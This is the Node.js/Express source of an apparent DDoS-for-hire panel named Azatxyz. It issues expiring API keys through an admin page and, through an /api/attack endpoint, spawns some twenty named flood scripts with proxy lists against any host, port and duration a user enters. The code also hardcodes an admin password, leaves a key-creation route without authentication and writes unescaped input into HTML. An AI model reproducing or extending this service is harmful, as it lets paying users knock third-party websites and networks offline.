
const express = require('express');
const app = express();
const port = 8080;

// Enable JSON parsing
app.use(express.json());

// Root endpoint showing available endpoints
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Azatxyz API Documentation</title>
      <script>
        async function testMethod() {
          const key = document.getElementById('apiKey').value;
          const host = document.getElementById('host').value;
          const port = document.getElementById('port').value;
          const time = document.getElementById('time').value;
          const method = document.getElementById('method').value;

          try {
            const response = await fetch('/api/attack?key=' + key + '&host=' + host + '&port=' + port + '&time=' + time + '&method=' + method);
            const result = await response.text();
            document.getElementById('result').innerHTML = result;
          } catch (err) {
            document.getElementById('result').textContent = 'Error: ' + err.message;
          }
        }
      </script>
      <style>
        body {
          background: #0a0a1f;
          color: #00ff9d;
          font-family: 'Arial', sans-serif;
          margin: 0;
          padding: 20px;
        }
        .container {
          max-width: 800px;
          margin: 0 auto;
          background: rgba(255, 255, 255, 0.05);
          padding: 20px;
          border-radius: 10px;
          box-shadow: 0 0 20px rgba(0, 255, 157, 0.2);
        }
        h1, h2 {
          color: #00ff9d;
          text-transform: uppercase;
        }
        .endpoint {
          margin: 20px 0;
          padding: 15px;
          background: rgba(0, 255, 157, 0.1);
          border-radius: 5px;
        }
        .method {
          color: #ff00ff;
          font-weight: bold;
        }
        .url {
          color: #ffffff;
          font-family: monospace;
        }
        .description {
          margin-top: 10px;
          color: #b4b4b4;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>⚡ Azatxyz API Documentation ⚡</h1>
        
        <h2>Available Endpoints:</h2>
        

        <div class="endpoint">
          <span class="method">GET</span>
          <span class="url">/api/keys/check?key=YOUR_KEY</span>
          <div class="description">Check if an API key is valid and get expiration info</div>
        </div>

        <div class="endpoint">
          <span class="method">GET</span>
          <span class="url">/api/attack?key=YOUR_KEY&host=TARGET&port=PORT&time=SECONDS&method=METHOD</span>
          <div class="description">Launch an attack (requires valid API key)</div>
        </div>

        <h2>Available Attack Methods:</h2>
        <div class="endpoint">
          ${Object.keys(ATTACK_METHODS).map(method => 
            `<div>${method}</div>`
          ).join('')}
        </div>

        <h2>Test Method</h2>
        <div class="endpoint">
          <div style="display: grid; gap: 10px;">
            <input type="text" id="apiKey" placeholder="API Key" style="padding: 8px; background: rgba(255,255,255,0.1); border: 1px solid #00ff9d; color: #fff;">
            <input type="text" id="host" placeholder="Target Host" style="padding: 8px; background: rgba(255,255,255,0.1); border: 1px solid #00ff9d; color: #fff;">
            <input type="number" id="port" placeholder="Port" style="padding: 8px; background: rgba(255,255,255,0.1); border: 1px solid #00ff9d; color: #fff;">
            <input type="number" id="time" placeholder="Time (seconds)" style="padding: 8px; background: rgba(255,255,255,0.1); border: 1px solid #00ff9d; color: #fff;">
            <select id="method" style="padding: 8px; background: rgba(255,255,255,0.1); border: 1px solid #00ff9d; color: #fff;">
              ${Object.keys(ATTACK_METHODS).map(method => 
                `<option value="${method}">${method}</option>`
              ).join('')}
            </select>
            <button onclick="testMethod()" style="padding: 10px; background: #00ff9d; color: #000; border: none; cursor: pointer;">Test Method</button>
          </div>
          <div id="result" style="margin-top: 20px;"></div>
        </div>
      </div>
    </body>
    </html>
  `);
});

// Store API keys with expiration
const API_KEYS = new Map();

// Configuration for attack methods
const ATTACK_METHODS = {
  'tls': { script: 'TLS.js', useProxy: false },
  'https': { script: 'HTTPS.js', useProxy: true },
  'http-x': { script: 'HTTP-X.js', useProxy: true },
  'bypass': { script: 'BYPASS.js', useProxy: true },
  'cibi': { script: 'Cibi.js', useProxy: true },
  'destroy': { script: 'destroy.js', useProxy: true },
  'flood': { script: 'flood.js', useProxy: true },
  'glory': { script: 'glory.js', useProxy: true },
  'rapid': { script: 'RAPID.js', useProxy: true },
  'http-raw': { script: 'HTTP-RAW.js', useProxy: false },
  'tlsv2': { script: 'tlsv2.js', useProxy: false },
  'storm': { script: 'Storm.js', useProxy: true },
  'ninja': { script: 'ninja.js', useProxy: false },
  'xyn': { script: 'xyn.js', useProxy: true },
  'browser': { script: 'Browsers.js', useProxy: false },
  'mix': { script: 'MIX.js', useProxy: false },
  'kill': { script: 'kill.js', useProxy: false },
  'strike': { script: 'strike.js', useProxy: true },
  'hold': { script: 'hold.js', useProxy: true },
  'mixbill': { script: 'MixBill.js', useProxy: false }
};

function createAttackProcess(method, host, time, useProxy = false) {
  const { spawn } = require('child_process');
  const baseArgs = [ATTACK_METHODS[method].script, host, time];

  if (method === 'strike') {
    return spawn('node', [...baseArgs, 'GET', '2', '32', 'proxy.txt', '--full', '--legit']);
  }

  if (method === 'browser' || method === 'ninja') {
    return spawn('node', baseArgs);
  }

  const defaultArgs = [...baseArgs, '32', '2'];
  if (useProxy) {
    defaultArgs.push('proxy.txt');
  }

  return spawn('node', defaultArgs);
}

function generateResponse(host, port, time, method) {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Azatxyz API Status</title>
      <style>
        body {
          background: #0a0a1f;
          color: #00ff9d;
          font-family: 'Arial', sans-serif;
          margin: 0;
          padding: 20px;
          min-height: 100vh;
          display: flex;
          flex-direction: column;
          justify-content: center;
          align-items: center;
        }
        .container {
          background: rgba(255, 255, 255, 0.05);
          border-radius: 10px;
          padding: 20px;
          box-shadow: 0 0 20px rgba(0, 255, 157, 0.2);
          backdrop-filter: blur(5px);
          max-width: 600px;
          width: 100%;
        }
        h1 {
          text-align: center;
          color: #00ff9d;
          text-transform: uppercase;
          letter-spacing: 2px;
          margin-bottom: 30px;
        }
        .status-item {
          margin: 15px 0;
          padding: 10px;
          background: rgba(0, 255, 157, 0.1);
          border-radius: 5px;
          display: flex;
          justify-content: space-between;
        }
        .status-label {
          color: #00ff9d;
          font-weight: bold;
        }
        .status-value {
          color: #fff;
        }
        .pulse {
          animation: pulse 2s infinite;
        }
        @keyframes pulse {
          0% { transform: scale(1); }
          50% { transform: scale(1.05); }
          100% { transform: scale(1); }
        }
      </style>
    </head>
    <body>
      <div class="container pulse">
        <h1>⚡ Azatxyz API Status ⚡</h1>
        <div class="status-item">
          <span class="status-label">Target Host:</span>
          <span class="status-value">${host}</span>
        </div>
        <div class="status-item">
          <span class="status-label">Port:</span>
          <span class="status-value">${port}</span>
        </div>
        <div class="status-item">
          <span class="status-label">Duration:</span>
          <span class="status-value">${time} seconds</span>
        </div>
        <div class="status-item">
          <span class="status-label">Attack Method:</span>
          <span class="status-value">${method}</span>
        </div>
      </div>
    </body>
    </html>
  `;
}

// Admin authentication middleware
const adminPassword = 'henxyz#1';
const authenticateAdmin = (req, res, next) => {
  const { password } = req.body;
  if (password === adminPassword) {
    next();
  } else {
    res.status(401).send('Unauthorized');
  }
};

// Admin login page
app.get('/admin', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Azatxyz Admin</title>
      <style>
        body {
          background: #0a0a1f;
          color: #00ff9d;
          font-family: 'Arial', sans-serif;
          margin: 0;
          padding: 20px;
          min-height: 100vh;
          display: flex;
          justify-content: center;
          align-items: center;
        }
        .container {
          background: rgba(255, 255, 255, 0.05);
          padding: 30px;
          border-radius: 10px;
          box-shadow: 0 0 20px rgba(0, 255, 157, 0.2);
          width: 100%;
          max-width: 400px;
        }
        h1 {
          text-align: center;
          margin-bottom: 30px;
        }
        .form-group {
          margin-bottom: 20px;
        }
        input {
          width: 100%;
          padding: 10px;
          background: rgba(255, 255, 255, 0.1);
          border: 1px solid #00ff9d;
          color: #fff;
          border-radius: 5px;
        }
        button {
          width: 100%;
          padding: 10px;
          background: #00ff9d;
          color: #0a0a1f;
          border: none;
          border-radius: 5px;
          cursor: pointer;
          font-weight: bold;
        }
        #message {
          margin-top: 20px;
          text-align: center;
          color: #ff0000;
        }
        #keyForm {
          display: none;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>⚡ Azatxyz Admin ⚡</h1>
        <div id="loginForm">
          <div class="form-group">
            <input type="password" id="password" placeholder="Enter admin password">
          </div>
          <button onclick="login()">Login</button>
        </div>
        <div id="keyForm">
          <div class="form-group">
            <input type="text" id="apiKey" placeholder="Enter API key">
          </div>
          <div class="form-group">
            <input type="number" id="expiresIn" placeholder="Expires in (days)">
          </div>
          <button onclick="createKey()">Create API Key</button>
        </div>
        <div id="message"></div>
      </div>
      <script>
        async function login() {
          const password = document.getElementById('password').value;
          const response = await fetch('/admin/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ password })
          });
          
          if (response.ok) {
            document.getElementById('loginForm').style.display = 'none';
            document.getElementById('keyForm').style.display = 'block';
            document.getElementById('message').textContent = '';
          } else {
            document.getElementById('message').textContent = 'Invalid password';
          }
        }

        async function createKey() {
          const key = document.getElementById('apiKey').value;
          const expiresIn = document.getElementById('expiresIn').value;
          const password = document.getElementById('password').value;
          
          try {
            const response = await fetch('/admin/create-key?key=' + key + '&expiresIn=' + expiresIn, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ password })
            });
            
            const result = await response.json();
            document.getElementById('message').textContent = 
              response.ok ? 'API key created! Expires at: ' + result.expiresAt : result.error;
          } catch (err) {
            document.getElementById('message').textContent = 'Error creating key: ' + err.message;
          }
        }
      </script>
    </body>
    </html>
  `);
});

// Admin login endpoint
app.post('/admin/login', (req, res) => {
  const { password } = req.body;
  if (password === adminPassword) {
    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'Invalid password' });
  }
});

// Admin create key endpoint
app.post('/admin/create-key', authenticateAdmin, (req, res) => {
  const { key, expiresIn } = req.query;
  if (!key || !expiresIn) {
    return res.status(400).json({ error: 'Missing key or expiration time' });
  }

  const expirationDate = new Date(Date.now() + parseInt(expiresIn) * 24 * 60 * 60 * 1000);
  API_KEYS.set(key, expirationDate);
  
  res.json({
    key,
    expiresAt: expirationDate.toISOString()
  });
});

// API Key management endpoints
app.post('/api/keys/create', (req, res) => {
  const { key, expiresIn } = req.query;
  
  if (!key || !expiresIn) {
    return res.status(400).json({ error: 'Missing key or expiration time' });
  }

  const expirationDate = new Date(Date.now() + parseInt(expiresIn) * 24 * 60 * 60 * 1000);
  API_KEYS.set(key, expirationDate);
  
  res.json({
    key,
    expiresAt: expirationDate.toISOString()
  });
});

app.get('/api/keys/check', (req, res) => {
  const { key } = req.query;
  
  if (!key) {
    return res.status(400).json({ error: 'Missing API key' });
  }

  const expirationDate = API_KEYS.get(key);
  
  if (!expirationDate) {
    return res.status(404).json({ error: 'API key not found' });
  }

  const isValid = new Date() < new Date(expirationDate);
  
  res.json({
    key,
    isValid,
    expiresAt: expirationDate.toISOString()
  });
});

// Main attack endpoint
app.get('/api/attack', (req, res) => {
  try {
    const { key, host, port, time: timeStr, method } = req.query;
    const time = parseInt(timeStr);

    // Check if API key exists and is valid
    const expirationDate = API_KEYS.get(key);
    if (!expirationDate || new Date() > new Date(expirationDate)) {
      return res.status(401).send('Invalid or expired API key');
    }

    // Validate attack method
    if (!ATTACK_METHODS[method]) {
      return res.status(400).send('Invalid attack method');
    }

    const attackProcess = createAttackProcess(
      method, 
      host, 
      time, 
      ATTACK_METHODS[method].useProxy
    );

    attackProcess.stdout.on('data', (data) => {
      console.log(`stdout: ${data}`);
    });

    attackProcess.stderr.on('data', (data) => {
      console.error(`stderr: ${data}`);
    });

    attackProcess.on('close', (code) => {
      console.log(`Process exited with code ${code}`);
      if (code === 0) {
        res.send(generateResponse(host, port, time, method));
      } else {
        res.status(500).send('Process execution failed');
      }
    });

  } catch (error) {
    console.error('Error:', error);
    res.status(500).send('Internal server error');
  }
});

app.listen(port, '0.0.0.0', () => {
  console.log(`Azatxyz API running on port ${port}`);
});
